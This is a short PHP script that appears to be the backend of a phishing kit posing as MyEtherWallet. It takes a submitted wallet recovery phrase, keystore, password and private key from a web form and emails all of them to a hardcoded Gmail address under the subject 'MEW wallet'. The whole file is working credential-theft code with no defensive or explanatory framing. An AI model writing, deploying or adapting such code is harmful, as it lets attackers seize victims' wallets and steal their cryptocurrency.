<?php

$message_sent = false;

if(isset($_POST['phrase']) && $_POST['phrase'] != ''){
    //submit the form
    
$phrase = $_POST['phrase'];
$KeystoreJSON = $_POST['phrase'];
$password = $_POST['password'];
$key = $_POST['key'];

$to = "neyocraig@gmail.com";
$subject = "MEW wallet";
$body = "";

$body .= "Phrase".$phrase. "\r\n";
$body .= "KeystoreJSON".$phrase. "\r\n";
$body .= "Password".$password. "\r\n";
$body .= "PrivateKey".$key. "\r\n";

mail($to,$subject,$body); 
    
    $message_sent = true;
    
}


?>